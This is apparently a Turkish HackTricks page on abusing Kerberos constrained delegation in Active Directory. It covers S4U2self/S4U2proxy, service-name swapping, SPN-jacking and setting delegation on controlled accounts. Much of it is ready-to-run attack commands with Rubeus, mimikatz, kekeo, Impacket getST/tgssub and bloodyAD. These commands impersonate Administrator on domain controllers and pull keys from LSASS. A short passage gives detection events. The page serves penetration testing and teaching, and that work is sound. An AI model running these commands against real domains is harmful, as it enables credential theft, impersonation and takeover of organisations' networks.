# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Bunu kullanarak bir Domain admin, bir bilgisayarın herhangi bir makinenin herhangi bir **service**’ine karşı **bir kullanıcıyı veya bilgisayarı taklit etmesine** **izin verebilir**.

- **Service for User to self (_S4U2self_):** **SPN sahibi** herhangi bir **service account**, genellikle rastgele bir kullanıcı adına kendisine bir TGS alabilir. Hesapta _userAccountControl_ içinde [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) da varsa bu TGS **forwardable** olur. Klasik **constrained delegation** için protocol transition’ı doğrudan kullanışlı kılan da budur.
- **Service for User to Proxy(_S4U2proxy_):** Bir **service account**, **msDS-AllowedToDelegateTo** içinde listelenen SPN’lere bir kullanıcı adına TGS alabilir. S4U2Proxy’de kullanılan kanıt bileti, devreden service’e yönelik **forwardable** bir bilet olmalıdır: ya kurbandan yakalanmış gerçek bir client-to-service bileti ya da **S4U2Self + T2A4D** ile oluşturulmuş bir bilet.

**Not**: AD’de bir kullanıcı ‘_Account is sensitive and cannot be delegated_’ olarak işaretlenmişse veya **Protected Users** üyesiyse, genellikle constrained delegation üzerinden onları **taklit edemezsiniz**. Modern domain’lerde delegation etkin hesapları hedeflerken yalnızca RC4 varsayımlarına dayanmak yerine **AES** materyalini tercih edin.

Bu, **service’in hash’ini ele geçirirseniz** kullanıcıları **taklit edebileceğiniz** ve belirtilen makinelerdeki herhangi bir **service**’e onların adına **erişim** sağlayabileceğiniz anlamına gelir (olası **privesc**).

Dahası, **kullanıcının taklit edebildiği service’e değil, herhangi bir service’e erişiminiz olur**; çünkü SPN (istenen service adı) denetlenmez (bilette bu bölüm şifrelenmez/imzalanmaz). Bu nedenle, **CIFS service**’ine erişiminiz varsa örneğin Rubeus’ta `/altservice` flag’ini kullanarak **HOST service**’ine de erişebilirsiniz. Aynı SPN değiştirme zayıflığı **Impacket getST -altservice** ve diğer araçlarla da kötüye kullanılır.

Ayrıca, bir **DCSync** istismar etmek için DC üzerindeki **LDAP service** erişimi gerekir.

```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```

**Operatör notu:** **gMSA/sMSA** incelemesi için yalnızca **ADUC** veya BloodHound ekran görüntülerine güvenmeyin. Bu hesaplarda genellikle alışılagelmiş Delegation sekmesi görünmez; bu nedenle ham **`userAccountControl`** ve **`msDS-AllowedToDelegateTo`** özniteliklerini doğrudan listeleyin.

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```

### Protokol geçişi ve yalnızca Kerberos constrained delegation

Ele geçirilmiş hesapta **T2A4D** varsa, genellikle yalnızca service key/TGT ile tam **`S4U2Self -> S4U2Proxy`** zincirini tamamlayabilirsiniz.<sup>[[2]](#references)</sup>

Hesapta yalnızca **`msDS-AllowedToDelegateTo`** varsa (klasik **"Use Kerberos only"** modu), delegation yine de kötüye kullanılabilir; ancak S4U2Proxy için kanıt bileti, delegation yapan service'e yönelik **forwardable user-to-service ticket** olmalıdır. Bunun bir yolu, kurbanın TGS'sini **LSASS/ccache** üzerinden yakalayıp ikinci aşamaya (`/tgs:` ile Rubeus'ta) aktarmaktır. **Non-forwardable** bir S4U2Self bileti, klasik constrained delegation için **yeterli değildir**; elinizdeki tek kanıt bileti buysa bunun yerine [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) bölümüne bakın.<sup>[[2]](#references)</sup>

Koşula bağlı başka bir yol da delegation yapan service'e ilk [RBCD](resource-based-constrained-delegation.md) adımını atmaktır: amaçlanan kullanıcı ve service için **forwardable** bir bilet üretiyorsa, bu bilet sonraki Kerberos-only S4U2Proxy adımında kanıt olarak kullanılabilir. İlk biletin flag'lerini, delegation yapan service'in SPN'sini, hedef allow-list'ini ve varsa kullanıcı delegation kısıtlamalarını doğrulayın; yalnızca bir RBCD attribute'ünü kontrol etmek, ikinci adımın mümkün olduğunu kanıtlamaz.

### Etki alanları arası constrained delegation notları (2025+)

**Windows Server 2012/2012 R2** sürümünden itibaren KDC, S4U2Proxy uzantıları aracılığıyla **etki alanları/forest'lar arasında constrained delegation** desteği sunar. Modern sürümler (Windows Server 2016–2025) bu davranışı korur ve protokol geçişini belirtmek için iki PAC SID'i ekler:<sup>[[1]](#references)</sup>

- Kullanıcı normal şekilde kimlik doğruladığında `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**).
- Bir service, protokol geçişi aracılığıyla kimliği doğruladığında `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**).

Etki alanları arasında protokol geçişi kullanıldığında PAC içinde `SERVICE_ASSERTED_IDENTITY` görülmesini bekleyin; bu, S4U2Proxy adımının başarıyla tamamlandığını doğrular.<sup>[[1]](#references)</sup>

### Impacket / Linux araçları (altservice ve full S4U)

Impacket'in güncel sürümleri (0.11.x+) Rubeus ile aynı S4U zincirini ve SPN değiştirme özelliğini sunar:<sup>[[2]](#references)</sup>

```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
         -impersonate Administrator contoso.local/websvc$ \
         -hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```

Kullanıcı ST'sini önce forge etmeyi tercih ediyorsanız (ör. yalnızca offline hash varsa), S4U2Proxy için **ticketer.py** ile **getST.py**'yi birlikte kullanın. Çalışan bir ccache'iniz varsa ve aynı host için yalnızca service class'ı değiştirmek istiyorsanız **tgssub.py** de kullanışlıdır. Güncel sorunlar için (forge edilmiş ST, SPN key'iyle eşleşmediğinde oluşan KRB_AP_ERR_MODIFIED dahil) Impacket issue #1713'e bakın.<sup>[[2]](#references)</sup>

### SPN-jacking: constrained-delegation hedefini yönlendirme

Klasik constrained delegation, değiştirilemez bir target SID'yi değil, `msDS-AllowedToDelegateTo` içindeki bir **SPN string** değerini yetkilendirir. S4U2Proxy sırasında KDC, o SPN'nin o anda sahibi olan hesabı çözümler ve service ticket'ı bu hesabın long-term key'iyle şifreler. Bu nedenle, delegating account üzerinde kontrol sahibi olmak ve başka bir service/computer account üzerinde `WriteSPN` yetkisine sahip olmak, `SeEnableDelegationPrivilege` olmadan değiştirilmemiş bir delegation constraint'i yönlendirmeyi mümkün kılar.<sup>[[5]](#references)[[6]](#references)</sup>

İki varyantı vardır:<sup>[[5]](#references)</sup>

- **Ghost SPN-jacking:** İzin verilen SPN, önceki sahibi silindiği, yeniden adlandırıldığı veya SPN'si kaldırıldığı için sahipsiz kalmıştır. SPN'yi doğrudan istenen hedef hesaba ekleyin.
- **Live SPN-jacking:** SPN hâlâ bir kaynak hesaba aittir. Yinelenen SPN doğrulaması normalde SPN'nin hedef hesaba eklenmesini engeller; bu nedenle her iki nesne üzerinde de `WriteSPN` gerekir: SPN'yi kaynaktan kaldırın, hedefe ekleyin, ticket'ı alın ve orijinal kaydı geri yükleyin.

Aşağıdaki soyutlanmış Linux akışı, izin verilen bir SPN'yi taşır, ele geçirilmiş delegating principal olarak S4U çalıştırır ve ticket'ın service name'ini yeni hedefteki kullanışlı bir service'e göre yeniden yazar.<sup>[[5]](#references)[[6]](#references)</sup>

```bash
# Omit this deletion for a ghost SPN
bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
  msldap delspn "$SOURCE_DN" "$DELEGATED_SPN"

bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
  msldap addspn "$TARGET_DN" "$DELEGATED_SPN"

getST.py -dc-ip "$DC_IP" -spn "$DELEGATED_SPN" \
  -impersonate Administrator -altservice "cifs/$TARGET_FQDN" \
  "$DOMAIN/$DELEGATING_ACCOUNT:$DELEGATING_PASSWORD"
```

`-altservice`, ayrı bir ikinci primitive'dir. S4U2Proxy ticket'ı, artık `$DELEGATED_SPN`'nin sahibi olan hesap için şifrelenmiştir; ticket service name (`sname`), şifrelenmiş ticket gövdesinin dışında olduğundan araçlar, servisi aynı hesap anahtarını kullanan başka bir service class/hostname ile değiştirebilir. SPN-jacking önce ticket'ı koruyan **hesap anahtarını** değiştirirken, service-class substitution ticket'ın **nereye sunulduğunu** değiştirir.<sup>[[5]](#references)[[6]](#references)</sup>

Canlı jacking sırasında, meşru servisi aksatmamak için ticket alındıktan hemen sonra iki LDAP yazma işleminin sırasını tersine çevirin. Computer-account auditing etkin olan DC'lerde, `servicePrincipalName`'in bir computer'dan kaldırılıp kısa süre sonra başka birine eklendiği Security event **4742** kayıtlarını arayın; özellikle SPN hostname'i hedefin `dNSHostName` değerinden farklıysa. Event **4769** ile ilişkilendirin: S4U2Self, client/service olarak aynı hesabı sunarken S4U2Proxy, **Transited Services** alanını doldurur.<sup>[[5]](#references)</sup>

### Kontrollü bir hesapta delegation yapılandırma

Bu yol, computer veya service hesabının delegation özniteliklerine **etkin yazma erişimi** (örneğin, `GenericAll` ya da ardından ACL değişikliği yapılan `WriteDACL`) **ve** LDAP değişikliğini yapan hesap için `SeEnableDelegationPrivilege` kullanıcı hakkı gerektirir. Microsoft, `msDS-AllowedToDelegateTo` değiştirildiğinde bu ayrıcalığın bulunmasını şart koşar; yalnızca nesne üzerindeki kontrol hakları bu gerekliliği aşmaz. Protocol-transition delegation ayarlamak için **bloodyAD** gibi bir LDAP client kullanmadan önce her iki ön koşulu da doğrulayın.<sup>[[Microsoft ADTS modify-operation security checks](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c714e48c-ea21-48b0-913d-fc065ab3dda3)]</sup>

```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```

Mevcut bir bilgisayar hesabı, `ms-DS-MachineAccountQuota` sıfır olsa bile aday olabilir; bu kota, mevcut bir nesne üzerindeki hakları değil, varsayılan yeni bilgisayar oluşturma yolunu sınırlar. Yapılandırılmış delegation'ı kullanmak için delegating account'un anahtarını veya parolasını kontrol etmeniz, geçerli bir service principal name'e ve kimlik bilgileri devredilebilir bir hedef kullanıcıya da sahip olmanız gerekir. Bu koşullar ve dizin üzerindeki etkin erişim ayrı ayrı denetlenmelidir.

- Adım 1: **İzin verilen service'in TGT'sini alın**

```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```

> [!WARNING]
> Bilgisayarda SYSTEM olmadan **TGT ticket** veya **RC4** ya da **AES256** elde etmenin **Printer Bug** ve unconstrained delegation, NTLM relaying ve Active Directory Certificate Service abuse gibi **başka yolları da vardır**
>
> **Yalnızca bu TGT ticket’a (veya hash’ine) sahip olmak, tüm bilgisayarı ele geçirmeden bu saldırıyı gerçekleştirmenizi sağlar.**

- Adım 2: **Kullanıcıyı taklit ederek servis için TGS alın**

```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```

[**ired.team'de daha fazla bilgi.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) ve [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Kerberos Constrained Delegation'a Genel Bakış (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Impacket ile Delegation Abuse (Bölüm 2): Constrained Delegation (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Kerberos Constrained Delegation (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity Killed the Domain: Offensive Kerberos'a Genel Bakış (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [5] [Elad Shamir - SPN-jacking: WriteSPN Abuse'da Bir Uç Durum](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/)
- [6] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
